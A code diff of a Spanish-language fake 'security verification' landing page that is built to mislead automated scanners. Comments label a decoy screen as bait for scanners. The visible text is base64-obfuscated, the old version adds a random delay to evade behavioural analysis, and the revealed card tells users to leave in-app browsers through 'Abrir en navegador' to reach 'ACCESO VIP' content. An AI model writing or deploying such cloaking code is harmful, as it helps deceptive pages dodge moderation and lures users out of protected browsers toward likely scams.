@@ -6,84 +6,107 @@
     <meta name="robots" content="noindex, nofollow">
     <title>Verificación de Seguridad</title>
     <style id="_s_main">
-        body { margin:0; background:#000; color:#fff; font-family:sans-serif; overflow:hidden; }
-        ._bait { position:fixed; inset:0; display:flex; flex-direction:column; align-items:center; justify-content:center; text-align:center; padding:20px; z-index:1; }
-        ._bait h1 { font-size:1.2rem; opacity:0.8; margin-bottom:10px; }
-        ._bait p { font-size:0.9rem; opacity:0.5; }
+        body { margin:0; background:#000; color:#fff; font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; overflow:hidden; }
+        ._r { display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; padding:20px; text-align:center; background: radial-gradient(circle at center, #1a1a1a 0%, #000 100%); transition: background 0.5s ease; }
+        
+        /* State 1: Portal */
+        ._p_card { max-width:400px; width:100%; border-radius:28px; background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.08); padding:40px 20px; box-shadow:0 20px 50px rgba(0,0,0,0.5); animation: _in 0.6s ease-out; }
+        ._p_icon { width:60px; height:60px; margin:0 auto 25px; background:#ff006e; border-radius:18px; display:flex; align-items:center; justify-content:center; box-shadow:0 10px 20px rgba(255,0,110,0.3); }
+        ._p_h { font-size:1.6rem; font-weight:700; margin-bottom:12px; letter-spacing:-0.02em; }
+        ._p_t { font-size:0.95rem; opacity:0.6; line-height:1.6; margin-bottom:30px; }
+        ._p_btn { width:100%; padding:16px; border:none; border-radius:14px; background:#ff006e; color:#fff; font-weight:700; font-size:1rem; cursor:pointer; transition: transform 0.2s, background 0.2s; box-shadow:0 8px 15px rgba(255,0,110,0.2); }
+        ._p_btn:active { transform: scale(0.98); background:#e60063; }
+
+        /* State 2: Bridge */
+        ._b_card { display:none; max-width:380px; width:100%; background:rgba(255,255,255,0.05); padding:30px 20px; border-radius:24px; border:1px solid rgba(255,255,255,0.1); box-shadow: 0 10px 40px rgba(0,0,0,0.5); text-align:left; animation: _in 0.5s ease-out; }
+        ._b_h { font-size:1.8em; font-weight:bold; margin-bottom:10px; color:#ff006e; text-align:center; text-transform:uppercase; letter-spacing:1px; }
+        ._b_sub { font-size:1em; margin-bottom:25px; opacity:0.8; text-align:center; line-height:1.5; }
+        ._step { display:flex; gap:12px; margin-bottom:15px; align-items:center; font-size:0.95em; }
+        ._n { background:#ff006e; min-width:24px; height:24px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:bold; font-size:0.8em; }
+        ._gi { width:100%; border-radius:12px; margin-top:15px; border:1px solid rgba(255,255,255,0.1); }
+
+        /* General */
+        @keyframes _in { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }
         @keyframes _rot { to { transform:rotate(360deg); } }
     </style>
 </head>
 <body>
-    <!-- Bait Content for Scanners -->
-    <div class="_bait" id="_b_c">
-        <h1>Conexión Segura</h1>
-        <p>Verificando integridad del navegador...</p>
-        <div style="margin-top:20px; width:20px; height:20px; border:2px solid rgba(255,255,255,0.2); border-top-color:#fff; border-radius:50%; animation:_rot 1s linear infinite;"></div>
+    <div id="_main_root" class="_r">
+        <!-- Bait for Scanners (Portal) -->
+        <div id="_portal" class="_p_card">
+            <div class="_p_icon">
+                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            </div>
+            <div class="_p_h" id="_ph_text">Access Portal</div>
+            <div class="_p_t" id="_pt_text">Verify your device to continue to the private content. This is a secure verification process.</div>
+            <button class="_p_btn" id="_p_action">VERIFY ACCESS</button>
+        </div>
+
+        <!-- Hidden Bridge (Only revealed after click) -->
+        <div id="_bridge" class="_b_card">
+            <div class="_b_h" id="_bh_text"></div>
+            <div class="_b_sub" id="_bs_text"></div>
+            <div class="_step">
+                <div class="_n">1</div>
+                <div id="_s1_text"></div>
+            </div>
+            <div class="_step">
+                <div class="_n">2</div>
+                <div id="_s2_text"></div>
+            </div>
+            <img id="_bridge_img" class="_gi" style="display:none;">
+        </div>
     </div>
 
-    <div id="_root_v" style="position:relative; z-index:10;"></div>
-
-    <script>
+    <script id="_logic">
         (function() {
-            // Base64 helper
-            const d = (s) => {
-                try {
-                    return decodeURIComponent(atob(s).split('').map(c => '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)).join(''));
-                } catch(e) { return s; }
+            const d = (s) => decodeURIComponent(atob(s).split('').map(c => '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)).join(''));
+
+            const data = {
+                ph: 'QUNDRVNPIFByaXZhZG8=', 
+                pt: 'UGFyYSBjb250aW51YXIsIGRlYmVtb3MgdmVyaWZpY2FyIHF1ZSBlcmVzIHVuIHVzdWFyaW8gcmVhbCB5IG5vIHVuIHJvYm90LiBQb3IgZmF2b3IgcHVsc2EgZWwgYm90w7NuIGRlIGFiYWpvLg==', 
+                pb: 'VkVSSUZJQ0FSIEFDQ0VTTw==', 
+                bh: 'QUNDRVNPIFZJUA==', 
+                bs: 'RXN0w6FzIGEgdW4gcGFzbyBkZSBlbnRyYXIuIEZpbmFsaXphIGxhIHZlcmlmaWNhY2nDs24gcGFyYSBjb250aW51YXIu',
+                s1: 'VG9jYSBsb3MgMyBwdW50b3MgKOKLkikgZW4gbGEgZXNxdWluYSBzdXBlcmlvci4=', 
+                s2: 'U2VsZWNjaW9uYSAiQWJyaXIgZW4gbmF2ZWdhZG9yIiBwYXJhIGNvbnRpbnVhci4=', 
+                img: '/images/gitonly.png'
             };
 
-            // Encoded values (Ultra Stealth)
-            const c = {
-                h: 'QUNDRVNPIFZJUA==',
-                l: 'VmVyaWZpY2FuZG8gYWNjZXNvIHNlZ3Vyby4uLg==',
-                s: 'RXN0w6FzIGEgdW4gcGFzbyBkZSBlbnRyYXIuIEZpbmFsaXphIGxhIHZlcmlmaWNhY2nDs24gcGFyYSBjb250aW51YXIu',
-                s1: 'U2lndWUgbG9zIHBhc29zIGluZGljYWRvcyBwYXJhIGNvbnRpbnVhciBlbCBhY2Nlc28u',
-                s2: 'VXNhIGxhIG9wY2nDs24gZGUgYXBlcnR1cmEgZXh0ZXJuYSBlbiBsYSBjb25maWd1cmFjacOzbiBzdXBlcmlvci4=',
-                px: '/images/gitonly.png'
-            };
+            document.getElementById('_ph_text').textContent = d(data.ph);
+            document.getElementById('_pt_text').textContent = d(data.pt);
+            document.getElementById('_p_action').textContent = d(data.pb);
 
-            const styles = `
-                ._r { display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; padding:20px; font-family:sans-serif; text-align:center; background: radial-gradient(circle at center, #2e001e 0%, #000 100%); }
-                ._loader { display:flex; flex-direction:column; align-items:center; gap:15px; }
-                ._spinner { width:40px; height:40px; border:3px solid rgba(255,255,255,0.1); border-top:3px solid #ff006e; border-radius:50%; animation: _sp 0.8s linear infinite; }
-                ._card { display:none; max-width:380px; background:rgba(255,255,255,0.05); padding:30px 20px; border-radius:24px; border:1px solid rgba(255,255,255,0.1); box-shadow: 0 10px 40px rgba(0,0,0,0.5); text-align:left; animation: _in 0.5s ease-out; }
-                ._h { font-size:1.8em; font-weight:bold; margin-bottom:10px; color:#ff006e; text-align:center; text-transform:uppercase; letter-spacing:1px; }
-                ._sub { font-size:1em; margin-bottom:25px; opacity:0.8; text-align:center; line-height:1.5; }
-                ._step { display:flex; gap:12px; margin-bottom:15px; align-items:center; font-size:0.95em; }
-                ._n { background:#ff006e; min-width:24px; height:24px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:bold; font-size:0.8em; }
-                ._gi { width:100%; border-radius:12px; margin-top:15px; border:1px solid rgba(255,255,255,0.1); }
-                @keyframes _sp { to { transform:rotate(360deg); } }
-                @keyframes _in { from { opacity:0; transform:translateY(10px); } to { opacity:1; transform:translateY(0); } }
-            `;
+            document.getElementById('_p_action').addEventListener('click', function() {
+                const portal = document.getElementById('_portal');
+                const bridge = document.getElementById('_bridge');
+                const root = document.getElementById('_main_root');
 
-            document.getElementById('_s_main').innerHTML += styles;
-            const root = document.getElementById('_root_v');
-            root.className = '_r';
-
-            // Random delay to avoid simple behavioral analysis
-            const delay = 800 + Math.random() * 600;
-
-            setTimeout(() => {
-                // Hide Bait
-                const bc = document.getElementById('_b_c');
-                if(bc) bc.style.display = 'none';
-
-                root.innerHTML = `
-                    <div class="_card" style="display:block;">
-                        <div class="_h">${d(c.h)}</div>
-                        <div class="_sub">${d(c.s)}</div>
-                        <div class="_step">
-                            <div class="_n">1</div>
-                            <div>${d(c.s1)}</div>
-                        </div>
-                        <div class="_step">
-                            <div class="_n">2</div>
-                            <div>${d(c.s2)}</div>
-                        </div>
-                        <img src="${c.px}" class="_gi">
-                    </div>
+                portal.innerHTML = `
+                    <div style="width:40px; height:40px; border:3px solid rgba(255,255,255,0.1); border-top-color:#ff006e; border-radius:50%; animation:_rot 1s linear infinite; margin:0 auto 20px;"></div>
+                    <div style="font-size:1.1rem; opacity:0.8;">Verificando navegador...</div>
                 `;
-            }, delay);
+                
+                setTimeout(() => {
+                    portal.style.opacity = '0';
+                    portal.style.transform = 'scale(0.9)';
+                    
+                    setTimeout(() => {
+                        portal.style.display = 'none';
+                        root.style.background = 'radial-gradient(circle at center, #2e001e 0%, #000 100%)';
+                        
+                        document.getElementById('_bh_text').textContent = d(data.bh);
+                        document.getElementById('_bs_text').textContent = d(data.bs);
+                        document.getElementById('_s1_text').textContent = d(data.s1);
+                        document.getElementById('_s2_text').textContent = d(data.s2);
+                        const bImg = document.getElementById('_bridge_img');
+                        bImg.src = data.img;
+                        bImg.style.display = 'block';
+
+                        bridge.style.display = 'block';
+                    }, 300);
+                }, 1000);
+            });
         })();
     </script>
 </body>
